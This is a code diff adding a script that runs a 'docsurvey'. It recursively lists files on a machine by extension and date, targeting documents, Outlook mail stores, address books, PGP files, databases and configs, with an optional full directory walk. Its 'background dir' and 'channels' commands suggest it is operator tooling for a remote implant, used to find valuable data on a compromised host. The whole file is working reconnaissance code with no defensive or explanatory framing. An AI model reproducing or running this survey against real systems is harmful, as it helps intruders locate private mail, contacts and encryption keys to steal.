@@ -1,0 +1,126 @@
+# Called from simple.eps
+
+string $lookfors;
+
+$lookfors[0] = ".doc";
+$lookfors[1] = ".pdf";
+$lookfors[2] = ".xls";
+$lookfors[3] = ".rtf";
+$lookfors[4] = ".mbx";
+$lookfors[5] = ".wab";
+$lookfors[6] = ".vsd";
+$lookfors[7] = ".ppt";
+
+string $extended;
+
+$extended[0] = ".tif";
+$extended[1] = ".dbx";
+$extended[2] = ".ost";
+$extended[3] = ".pst";
+$extended[4] = ".mdb";
+$extended[5] = ".cfg";
+$extended[6] = ".pgp";
+$extended[7] = ".msg";
+$extended[8] = ".net";
+$extended[9] = ".zip";
+$extended[10] = ".log";
+
+
+bool $showUsage = false;
+bool $success = true;
+bool $ask = false;
+string $datefrom;
+
+if ($argc <= 1) {
+    $datefrom=GetInput("When do you want a docsurvey since? (type 'all' to get all, 'none' to cancel) ");
+} else if ($argv[1] == "?") {
+    $showUsage = true;
+} else {
+    $datefrom=$argv[1];
+}
+
+if ($argc == 3 ) {
+	if ( $argv[2] == "-fast" ) {
+		$ask = false;
+	}
+}
+
+if ($showUsage) {
+    echo "Usage: $argv[0] <from date|'all'|'none'> ['-fast']";
+	echo "  use 'all' as the date to get all files";
+	echo "  use 'none' as the date to change your mind and get no files";
+    return $success;
+}
+
+bool $date=true;
+if ($datefrom == "fast") {
+	$ask=false;
+	$datefrom=GetInput("When do you want a docsurvey since? (type 'all' to get all, 'none' to cancel) ");
+}
+
+if ($datefrom == "all") {
+	$date=false;
+}
+
+if ($datefrom == "none") {
+	return false;
+}
+
+
+int $i = 0;
+
+while ( $i < sizeof($lookfors) ) {
+	if ( $ask == true ) {
+		if (prompt "Do you want a listing of all $lookfors[$i] files?") {
+			if ($date == false) {
+				`background dir *$lookfors[$i] -path * -recursive -max 0`;
+			} else {
+				`background dir *$lookfors[$i] -path * -recursive -max 0 -after $datefrom`;
+			}
+		}	
+	} else {
+		if ($date == false) {
+			`background dir *$lookfors[$i] -path * -recursive -max 0`;
+		} else {
+			`background dir *$lookfors[$i] -path * -recursive -max 0 -after $datefrom`;
+		}
+	}
+	$i++;
+}
+
+if (prompt "Do you want to do an extended survey?") {
+	$i=0;
+	while ( $i < sizeof($extended) ) {
+		if ( $ask == true ) {
+			if (prompt "Do you want a listing of all $extended[$i] files?") {
+				if ($date == false) {
+					`background dir *$extended[$i] -path * -recursive -max 0`;
+				} else {
+					`background dir *$extended[$i] -path * -recursive -max 0 -after $datefrom`;
+				}
+			}	
+		} else {
+			if ($date == false) {
+				`background dir *$extended[$i] -path * -recursive -max 0`;
+			} else {
+				`background dir *$extended[$i] -path * -recursive -max 0 -after $datefrom`;
+			}
+		}
+		$i++;
+	}
+}
+
+if ($date == true) {
+	if (prompt "Do you want to do a full dirwalk since the date you specified?") {
+		if ($date == false) {
+			`background dir * -path * -recursive -max 0`;
+		} else {
+			`background dir * -path * -recursive -max 0 -after $datefrom`;
+		}
+	}
+}
+
+`channels`;
+return $success;
+
+#bool $extend = GetInput("Do you want to do an extended survey?");
